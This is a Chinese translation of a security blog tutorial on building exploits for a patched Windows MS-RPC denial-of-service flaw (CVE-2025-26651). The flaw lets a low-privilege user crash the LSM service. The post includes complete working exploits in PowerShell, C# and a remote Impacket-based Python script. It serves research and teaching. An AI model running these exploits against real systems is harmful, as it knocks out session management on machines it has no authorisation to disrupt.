#  Windows MS-RPC 漏洞利用开发  
Remco van der
                    Remco van der  securitainment   2026-04-02 04:42  
  
> 展示几种针对 MS-RPC 漏洞编写利用程序的不同方法  
  
  
![Preview Image](https://mmbiz.qpic.cn/mmbiz_png/h4gtbB74nSia3ibCGZNZnZuvu9hQsiaVkOicW0oRydhmDKMKBQUtKYuorGVyLmjslia87ttGiaUjFHt0gVU7r9DlIumppjxMz7ZCI1sXvibCeicjG9s/640?wx_fmt=png&from=appmsg "")  
<table><thead><tr style="border-top-width: 1px;border-top-style: solid;border-top-color: rgb(204, 204, 204);background-color: white;margin: 0px;padding: 0px;"><th style="font-weight: bold;border: 1px solid rgb(204, 204, 204);text-align: left;margin: 0px;padding: 6px 13px;"><section><span leaf="">原文链接</span></section></th><th style="font-weight: bold;border: 1px solid rgb(204, 204, 204);text-align: left;margin: 0px;padding: 6px 13px;"><section><span leaf="">作者</span></section></th></tr></thead><tbody><tr style="border-top-width: 1px;border-top-style: solid;border-top-color: rgb(204, 204, 204);background-color: white;margin: 0px;padding: 0px;"><td style="border: 1px solid rgb(204, 204, 204);text-align: left;margin: 0px;padding: 6px 13px;"><section><span leaf="">https://www.incendium.rocks/posts/Exploit-Development-For-MSRPC/</span></section></td><td style="border: 1px solid rgb(204, 204, 204);text-align: left;margin: 0px;padding: 6px 13px;"><section><span leaf="">Remco van der Meer</span></section></td></tr></tbody></table>## 引言  
  
在我对 MS-RPC 的研究过程中，我发现了多个漏洞，并将它们连同可用的概念验证 (PoC) 一起报告给了 Microsoft。当时我需要在网上查找如何针对 MS-RPC 漏洞编写利用程序，但相关资料非常匮乏。希望这篇博客能够填补这方面的空白，帮助大家学会自己编写这类利用程序。  
  
本文将介绍三种针对同一漏洞编写可用利用程序的方法，涵盖 PowerShell、.NET (可执行文件) 以及用于远程利用的 Python。  
## 漏洞  
  
由于我们需要一个同时支持本地和远程利用的漏洞，我选择了 CVE-2025-26651 作为演示对象。该漏洞的影响类型为拒绝服务 (Denial of Service)，因为它能在低权限用户上下文中使 LSM (Local Session Manager) 服务崩溃。Microsoft 已在四月份的更新中修复了此漏洞。  
  
该漏洞的本质是调用了一个本不应在 RPC 服务器中实现的过程。正常情况下，RPC 服务器应返回 0x80004001  
，即 Windows 中表示 Not implemented  
的错误码。然而，RPC 运行时仍然允许对该过程进行调用。如果你感兴趣，可以在这里阅读更多关于该漏洞的详细分析。  
  
包含该漏洞过程的 LSM RPC 接口为 88143fd0-c28d-4b2b-8fef-8d882f6a9390  
，漏洞过程为 RpcGetSessionIds  
，其定义如下:  
```
RpcGetSessionIds(NtCoreLib.Ndr.Marshal.NdrEnum16 p0, int p1)
```  
## PowerShell  
  
在我看来，PowerShell 是在本地与 RPC 交互的最简单、最便捷的方式。我们只需要 NtObjectManager PowerShell 模块即可。通常情况下，你不会在实际的漏洞利用场景中使用 PowerShell，因为你需要导入整个模块的源代码或者通过 Install-Module  
安装模块，这并不是很理想。不过，它非常适合用来快速验证漏洞和测试利用思路。  
  
首先，安装该模块:  
```
Install-Module NtObjectManager
```  
  
模块安装完成后，我们需要使用 Get-RpcServer  
获取 RPC 服务器的接口，同时传入 dbghelp.dll  
进行符号解析。之所以要解析 dbghelp.dll  
，是为了获取 RPC 服务器的符号信息。否则，漏洞过程 RpcGetSessionIds  
将显示为类似 Proc15  
的通用名称。  
```
$vulnrpcserver="$env:systemdrive\windows\system32\lsm.dll"|Get-RpcServer-DbgHelpPath ".\dbghelp.dll"
```  
  
不过，如果我们现在检查 $vulnrpcserver  
，会发现它包含 9 个 RPC 接口  
```
$rpcinterfaceName    UUID                                 Ver Procs EPs Service Running---------------------------------lsm.dll 11f25515-c879-400a-989e-b074d5f092fe 1.0110   LSM     Falselsm.dll 1e665584-40fe-4450-8f6e-8023623996941.040   LSM     Falselsm.dll 88143fd0-c28d-4b2b-8fef-8d882f6a9390 1.0120   LSM     Falselsm.dll 11899a43-2b68-4a76-92e3-a3d6ad8c26ce 1.040   LSM     Falselsm.dll 53825514-1183-4934-a0f4-cfdc51c3389b 1.050   LSM     Falselsm.dll e3907f22-c899-44e7-9d11-9d8b3d924832 1.070   LSM     Falselsm.dll c2d15ccf-a416-46dc-ba58-4624ac7a9123 1.030   LSM     Falselsm.dll 484809d6-4239-471b-b5bc-61df8c23ac48 1.0210   LSM     Falselsm.dll c938b419-5092-4385-8360-7cdc9625976a 1.020   LSM     False
```  
  
漏洞过程 RpcGetSessionIds  
位于 88143fd0-c28d-4b2b-8fef-8d882f6a9390  
接口中。我们也可以直接筛选获取该接口。  
```
$vulnrpcinterface="$env:systemdrive\windows\system32\lsm.dll"|Get-RpcServer-DbgHelpPath ".\dbghelp.dll"|? {$_.InterfaceId-eq'88143fd0-c28d-4b2b-8fef-8d882f6a9390'}
```  
  
现在只剩下一个接口，正是我们需要的:  
```
$vulnrpcinterfaceName    UUID                                 Ver Procs EPs Service Running---------------------------------lsm.dll 88143fd0-c28d-4b2b-8fef-8d882f6a9390 1.0120   LSM     True
```  
  
要实际调用漏洞过程，我们需要一个已连接到 RPC 端点的 RPC 客户端。可以通过以下命令查看有哪些可用的端点:  
```
$vulnrpcinterface.Endpoints
```  
  
然而，Get-RpcServer  
函数似乎无法发现任何端点。另一种方法是结合 -FindAlpcPort  
开关使用 Get-RpcEndpoint  
，它会对本地端点映射器进行暴力枚举，查找 ALPC (Advanced Local Procedure Call) 端点。  
```
Get-RpcEndpoint-InterfaceId 88143fd0-c28d-4b2b-8fef-8d882f6a9390 -InterfaceVersion 1.0-FindAlpcPortUUID                                 Version Protocol Endpoint                        Annotation-------------------------------------88143fd0-c28d-4b2b-8fef-8d882f6a9390 1.0     ncalrpc  LSMApi88143fd0-c28d-4b2b-8fef-8d882f6a9390 1.0     ncalrpc  LRPC-34828d104667efa88f88143fd0-c28d-4b2b-8fef-8d882f6a9390 1.0     ncalrpc  OLEF301E99E9C25C368F9F1CF081E88
```  
  
三个端点都可以选择，但一般来说，我们希望选择一个在系统重启后依然可用、并且在其他系统上也能正常工作的端点。基于这些原因，我们选择 LSMApi  
端点。要创建 RPC 客户端并连接到 LSMApi  
端点，可以使用 Get-RpcClient  
和 Connect-RpcClient  
。要指定客户端连接的端点，我们使用 -StringBinding  
参数，该参数接受协议序列与端点的组合，本例中为 ncalrpc 与端点名称的组合。  
```
$client=$vulnrpcinterface|Get-RpcClientconnect-RpcClient$client-StringBinding "ncalrpc:[LSMApi]"$clientNew               : _ConstructorsNewArray          : _Array_ConstructorsConnected         : TrueEndpoint          : \RPC Control\LSMApiProtocolSequence  : ncalrpcObjectUuid        :InterfaceId       : 88143fd0-c28d-4b2b-8fef-8d882f6a9390:1.0Transport         : NtCoreLib.Win32.Rpc.Transport.RpcAlpcClientTransportDefaultTraceFlags : None
```  
  
现在我们已经有了连接好的客户端，可以调用过程了 (前提是我们有权限这样做)。  
```
$client.RpcGetSessionIds(0,0)MethodInvocationException: Exception calling "RpcGetSessionIds" with "2" argument(s): "(0xC0000701) - The ALPC message requested is no longer available."
```  
  
漏洞过程被成功调用，LSM 服务随即崩溃！总结以上步骤，下面的 PowerShell 脚本可以作为完整的利用程序使用:  
```
# Get vulnerable RPC interface object$vulnrpcinterface="$env:systemdrive\windows\system32\lsm.dll"|Get-RpcServer-DbgHelpPath ".\dbghelp.dll"|? {$_.InterfaceId-eq'88143fd0-c28d-4b2b-8fef-8d882f6a9390'}# Get a RPC client$client=$vulnrpcinterface|Get-RpcClientconnect-RpcClient$client-StringBinding "ncalrpc:[LSMApi]"# Invoke procedure$client.RpcGetSessionIds(0,0)
```  
  
该脚本假设 NtObjectManager 模块已经安装。你也可以下载源代码，然后使用 Import-Module .\NtObjectManager\NtObjectManager.psm1  
手动导入模块。  
## 可执行文件  
  
要编写利用程序并将其编译为可执行文件或 DLL，我通常使用 Visual Studio。针对 MS-RPC 编写可执行利用程序有多种方法。本文选择使用 NtObjectManager 库。它的一个缺点是库体积较大，导致我们的利用程序体积也会相应增大。不过，它确实是编写可用利用程序的一种便捷方式。  
  
首先我们需要获取 RPC 客户端的源代码。本例中，源代码使用 C# 语言编写。手动编写这些代码会非常繁琐，好在有一种方法可以自动生成。  
  
这里我们再次需要用到 NtObjectManager PowerShell 模块。这次只需创建 RPC 接口对象，然后通过管道传递给 Format-RpcClient  
即可。  
```
$vulnrpcinterface="$env:systemdrive\windows\system32\lsm.dll"|Get-RpcServer-DbgHelpPath ".\dbghelp.dll"|? {$_.InterfaceId-eq'88143fd0-c28d-4b2b-8fef-8d882f6a9390'}$vulnrpcinterface|Format-RpcClient
```  
  
以上命令将输出如下 C# 代码:  
```
//------------------------------------------------------------------------------// <auto-generated>//     This code was generated by a tool.////     Changes to this file may cause incorrect behavior and will be lost if//     the code is regenerated.// </auto-generated>//------------------------------------------------------------------------------// Source Executable: c:\windows\system32\lsm.dll// Interface ID: 88143fd0-c28d-4b2b-8fef-8d882f6a9390// Interface Version: 1.0// Client Generated: 31-7-2025 10:14:19// NtCoreLib Version: 9.0.6+3875b54e7b10b10606b105340199946d0b877754namespacerpc_88143fd0_c28d_4b2b_8fef_8d882f6a9390_1_0{    #region Marshal Helpersinternalsealedclass_Marshal_Helper : NtCoreLib.Ndr.Marshal.NdrMarshalBufferDelegator    {public_Marshal_Helper() :this(newNtCoreLib.Ndr.Marshal.NdrMarshalBuffer())        {        }public_Marshal_Helper(NtCoreLib.Ndr.Marshal.INdrMarshalBufferm) :base(m)        {        }....<snipped>
```  
  
我们可以将代码复制粘贴到 Visual Studio 中，也可以直接导出为 .cs  
文件:  
```
$vulnrpcinterface|Format-Rpcclient-OutputPath ./
```  
  
导出的文件名为 88143fd0-c28d-4b2b-8fef-8d882f6a9390_1.0.cs  
。接下来，打开 Visual Studio 并创建一个新项目，选择 Console App (.NET Framework) 类型。项目初始会包含一个 Program.cs  
文件，我们将在其中编写利用代码。在此之前，先将 88143fd0-c28d-4b2b-8fef-8d882f6a9390_1.0.cs  
文件拖入解决方案资源管理器。如果一切顺利，你将看到类似下图的结构:  
  
Visual Studio 中利用程序的解决方案资源管理器  
  
在编辑 Program.cs  
之前，我们需要将 NtObjectManager.dll  
添加为项目的引用。否则 88143fd0-c28d-4b2b-8fef-8d882f6a9390_1.0.cs  
中的代码将无法编译。右键点击"引用"，选择"添加引用"，然后浏览找到 NtObjectManager.dll  
的路径。如果已安装该模块，它通常位于 C:\Program Files\WindowsPowerShell\Modules\NtObjectManager\2.0.1  
。  
  
现在开始编写利用代码！首先导入必要的库 (如果 VS 尚未自动添加):  
```
using System;using rpc_88143fd0_c28d_4b2b_8fef_8d882f6a9390_1_0;
```  
  
NtObjectManager PowerShell 模块会自动处理 RPC 过程的输出参数，因此我们通常只需指定输入参数。但在本例中，我们还需要为输出参数创建缓冲区。要了解该过程需要哪些输入和输出参数，只需查看生成的 RPC 客户端文件 88143fd0-c28d-4b2b-8fef-8d882f6a9390_1.0.cs  
，搜索该过程即可:  
```
RpcGetSessionIds(NtCoreLib.Ndr.Marshal.NdrEnum16 p0, int p1, out int[] p2, out int p3)
```  
  
在本例中，p2 为整数数组，p3 为整数。  
  
我们编写一个简单的 Program  
类。该类只包含一个 Main  
函数，返回类型为 Void  
，不接受任何参数。它的功能是创建一个 RPC 客户端对象，连接到 LSMApi  
端点，然后调用漏洞过程:  
```
using System;using rpc_88143fd0_c28d_4b2b_8fef_8d882f6a9390_1_0;classProgram{staticvoidMain()    {try        {using (Client client = new Client())            {                client.Connect("LSMApi");int[] someIntArray;int someInt = 0;try                {                    client.RpcGetSessionIds(0,0, out someIntArray, out someInt);                }catch { }            }        }catch (Exception ex)        {            Console.WriteLine($"Error: {ex.Message}");        }finally        {            Console.WriteLine("Execution finished.");        }    }}
```  
  
代码中还包含了错误处理逻辑，你也可以选择省略。至此利用程序编写完成，可以构建了。点击 Build -> Build Solution。  
```
1>------ Build started: Project: PoC, Configuration: Release Any CPU ------1>  PoC -> C:\Users\user\Documents\PoC\PoC\bin\Release\PoC.exe========== Build: 1 succeeded, 0 failed, 0 up-to-date, 0 skipped ==================== Build completed at 10:40 and took 01,161 seconds ==========
```  
  
我们没有将 NtObjectManager.dll  
库编译到可执行文件中。因此，要运行 Poc.exe  
，还需要将 NtObjectManager.dll  
复制到同一目录下。这一点需要注意。  
## Python  
  
本文的最后一部分将重点介绍如何使用 Python 构建利用程序。当 RPC 接口同时通过命名管道端点暴露时，我们可以通过 SMB 端口 135/445 进行远程连接。在这种情况下，漏洞被利用的可能性将大幅增加，因为攻击者无需获得本地访问权限。  
  
要确认是否可以通过命名管道连接到 LSM RPC 接口 88143fd0-c28d-4b2b-8fef-8d882f6a9390  
，我们无法依赖 NtObjectManager。作为替代，我通常使用 RpcView 来查看所有可用端点。  
  
LSM RPC 服务器的可用 RPC 端点  
  
LSM 的命名管道为 \pipe\LSM_API_service  
。确认存在可用的命名管道后，我们可以继续编写 Python 利用程序。我们将使用 Impacket库，特别是其中的 DCERPC version 5 部分。此外，还需要导入 sys  
和 argparse  
模块，用于解析脚本参数中的用户名和密码并传递给 Impacket。  
```
import sysimport argparsefrom impacket import system_errorsfrom impacket.dcerpc.v5 import transportfrom impacket.dcerpc.v5.ndr importNDRCALL, NDRSTRUCTfrom impacket.dcerpc.v5.dtypes importUUID, ULONG, WSTR, DWORD, NULL, BOOL, UCHAR, PCHAR, RPC_SID, LPWSTRfrom impacket.dcerpc.v5.rpcrt importDCERPCException, RPC_C_AUTHN_WINNT, RPC_C_AUTHN_LEVEL_PKT_PRIVACYfrom impacket.uuid import uuidtup_to_bin
```  
  
接下来，我们创建一个处理 RPC 异常的类。这是一个非常通用的类，在大多数使用 Impacket RPC 的 Python 脚本中都能看到。它会将 RPC 错误格式化为清晰的错误消息，便于调试。  
```
classDCERPCSessionError(DCERPCException):def__init__(self, error_string=None, error_code=None, packet=None):DCERPCException.__init__(self, error_string, error_code, packet)def__str__( self ):        key =self.error_codeif key in system_errors.ERROR_MESSAGES:            error_msg_short = system_errors.ERROR_MESSAGES[key][0]            error_msg_verbose = system_errors.ERROR_MESSAGES[key][1]return'SessionError: code: 0x%x - %s - %s'% (self.error_code, error_msg_short, error_msg_verbose)else:return'SessionError: unknown error code: 0x%x'%self.error_code
```  
  
接下来，我们需要获取漏洞过程 RpcGetSessionIds  
的 opnum (操作编号)。如果运气好，Microsoft 文档中会记录该信息，本例中就是如此。该过程的 opnum 为 8。如果没有找到官方文档，也可以使用 NtObjectManager PowerShell 模块中的 Format-RpcClient  
，具体方法参见本文 PowerShell 章节中的说明。它会生成客户端的 C# 源代码，其中包含各个过程的定义:  
```
publicint RpcGetSessionIds(NtCoreLib.Ndr.Marshal.NdrEnum16 p0, int p1, out int[] p2, out int p3){    _Marshal_Helper @__m = new _Marshal_Helper(CreateMarshalBuffer());    @__m.WriteEnum16(p0);    @__m.WriteInt32(p1);    _Unmarshal_Helper @__u = SendReceive(8, @__m);try    {        p2 = @__u.ReadReferent<int[]>(new System.Func<int[]>(@__u.Read_16), false);        p3 = @__u.ReadInt32();return @__u.ReadInt32();    }finally    {        @__u.Dispose();    }}
```  
  
其中第 6 行 _Unmarshal_Helper @__u = SendReceive(8, @__m);  
包含了 opnum (8)。回到 Python 利用程序，我们需要定义 RPC 调用的数据结构。具体来说，我们将创建 RPC 会话输入和响应的结构体，同时为调用本身创建输入和输出的结构体，它们基于上述 RPC 会话类构建。  
```
################################################################################# RPC CALLS################################################################################classRPCSESSIONINPUT(NDRSTRUCT):    structure = (        ('p0', DWORD),        ('p1', DWORD),    )classRPCSESSIONRESPONSE(NDRSTRUCT):    structure = (        ('p2', ULONG),        ('p3', ULONG),    )classRpcGetSessionIds(NDRCALL):    opnum =8    structure = (        ('input',RPCSESSIONINPUT),    )classRpcGetSessionIdsResponse(NDRCALL):    structure = (        ('response', RPCSESSIONRESPONSE),    )
```  
  
接下来，引用 opnum 及其对应的结构体:  
```
################################################################################# OPNUMs and their corresponding structures################################################################################OPNUMS= {8   : (RpcGetSessionIds, RpcGetSessionIdsResponse),}
```  
  
利用程序的最后一个类包含两个函数。connect  
函数负责定义 RPC 接口和端点，并使用 Impacket 的认证机制通过命名管道连接到 RPC 接口。该函数同时支持 NTLM 和 Kerberos 认证。  
  
RpcGetSessionIds  
函数使用前面定义的 RPC 调用数据结构类，按照指定参数发起实际的 RPC 调用。  
```
classCrashLSM():defconnect(self, username, password, domain, lmhash, nthash, target, doKerberos, dcHost, targetIp):        binding_params = {'LSM_API_SERVICE': {'stringBinding': r'ncacn_np:%s[\pipe\LSM_API_SERVICE]'% target,'MSRPC_UUID_LSM': ('88143fd0-c28d-4b2b-8fef-8d882f6a9390', '1.0')            },        }        rpctransport = transport.DCERPCTransportFactory(binding_params["LSM_API_SERVICE"]['stringBinding'])ifhasattr(rpctransport, 'set_credentials'):            rpctransport.set_credentials(username=username, password=password, domain=domain, lmhash=lmhash, nthash=nthash)if doKerberos:            rpctransport.set_kerberos(doKerberos, kdcHost=dcHost)if targetIp:            rpctransport.setRemoteHost(targetIp)        dce = rpctransport.get_dce_rpc()        dce.set_auth_type(RPC_C_AUTHN_WINNT)        dce.set_auth_level(RPC_C_AUTHN_LEVEL_PKT_PRIVACY)print("[-] Connecting to %s"% binding_params["LSM_API_SERVICE"]['stringBinding'])try:            dce.connect()exceptExceptionas e:print("Something went wrong, check error status => %s"%str(e))#sys.exit()returnprint("[+] Connected!")print("[+] Binding to %s"% binding_params["LSM_API_SERVICE"]['MSRPC_UUID_LSM'][0])try:            dce.bind(uuidtup_to_bin(binding_params["LSM_API_SERVICE"]['MSRPC_UUID_LSM']))exceptExceptionas e:print("Something went wrong, check error status => %s"%str(e))#sys.exit()returnprint("[+] Successfully bound!")return dcedefRpcGetSessionIds(self, dce):print("[-] Sending RpcGetSessionIds!")try:            request = RpcGetSessionIds()            request['input']['p0'] =0            request['input']['p1'] =0            request.dump()            resp = dce.request(request)exceptExceptionas e:print(e)
```  
  
利用程序的最后一个函数 (main) 使用 argparse  
库解析用户指定的参数，将其传递给 Impacket 并启动利用程序。  
```
defmain():    parser = argparse.ArgumentParser(add_help=True, description="Crash LSM PoC")    parser.add_argument('-u', '--username', action="store", default='', help='valid username')    parser.add_argument('-p', '--password', action="store", default='', help='valid password (if omitted, it will be asked unless -no-pass)')    parser.add_argument('-d', '--domain', action="store", default='', help='valid domain name')    parser.add_argument('-hashes', action="store", metavar="[LMHASH]:NTHASH", help='NT/LM hashes (LM hash can be empty)')    parser.add_argument('-no-pass', action="store_true", help='don\'t ask for password (useful for -k)')    parser.add_argument('-k', action="store_true", help='Use Kerberos authentication. Grabs credentials from ccache file ''(KRB5CCNAME) based on target parameters. If valid credentials ''cannot be found, it will use the ones specified in the command ''line')    parser.add_argument('-dc-ip', action="store", metavar="ip address", help='IP Address of the domain controller. If omitted it will use the domain part (FQDN) specified in the target parameter')    parser.add_argument('-target-ip', action='store', metavar="ip address",help='IP Address of the target machine. If omitted it will use whatever was specified as target. ''This is useful when target is the NetBIOS name or Kerberos name and you cannot resolve it')    parser.add_argument('target', help='ip address or hostname of target')    options = parser.parse_args()if options.hashes isnotNone:        lmhash, nthash = options.hashes.split(':')else:        lmhash =''        nthash =''if options.password ==''and options.username !=''and options.hashes isNoneand options.no_pass isnotTrue:from getpass import getpass        options.password = getpass("Password:")    plop = CrashLSM()    dce = plop.connect(username=options.username, password=options.password, domain=options.domain, lmhash=lmhash, nthash=nthash, target=options.target, doKerberos=options.k, dcHost=options.dc_ip, targetIp=options.target_ip)if dce isnotNone:        plop.RpcGetSessionIds(dce)        dce.disconnect()    sys.exit()
```  
  
最后两行代码确保脚本被直接执行时调用 main 函数:  
```
if__name__=='__main__':    main()
```  
  
现在，我们可以使用 NTLM 认证来执行利用:  
  
远程利用成功，LSM 服务崩溃  
## 结论  
  
希望这篇博客能够帮助大家了解如何针对 Windows 上的 MS-RPC 漏洞编写利用程序。本文介绍了本地利用方式 (使用 PowerShell 和 .NET) 以及远程利用方式 (Python)。此外，我建议在实际开发时先用 PowerShell 脚本进行原型验证，明确利用程序的需求后，再迁移到 .NET 或 Python 编写适用于真实场景的利用程序。  
## 参考来源  
### 工具与仓库  
- **NtObjectManager (Google Project Zero)**  
一套用于检查 Windows 内核对象和 RPC 接口的工具。  
  
GitHub 仓库  
  
- **NtObjectManager PowerShell 模块**  
用于与 Windows 内核对象交互的 PowerShell 模块，适用于安全研究。  
  
PowerShell Gallery  
  
---  
### 技术博客与分析文章  
- **Automating MS-RPC Vulnerability Research**  
(Incendium)  
深入探讨如何自动化发现和分析 Windows 中的 RPC 漏洞。  
  
阅读博客  
  
- **CVE-2025-26651: Pressing the LSM Kill Switch**  
(Warpnet)  
CVE-2025-26651 的技术分析和利用说明。  
  
阅读博客  
  
---  
### 官方文档与安全公告  
- **Microsoft 安全公告: CVE-2025-26651**  
Microsoft 针对 LSM 漏洞的官方公告和缓解指南。  
  
查看公告  
  
- **[MS-TSTS]: Terminal Services Terminal Server Protocol Specification**  
Microsoft 终端服务协议的正式规范。  
  
阅读规范  
  
---  
> 免责声明：本博客文章仅用于教育和研究目的。提供的所有技术和代码示例旨在帮助防御者理解攻击手法并提高安全态势。请勿使用此信息访问或干扰您不拥有或没有明确测试权限的系统。未经授权的使用可能违反法律和道德准则。作者对因应用所讨论概念而导致的任何误用或损害不承担任何责任。  
  
  
  
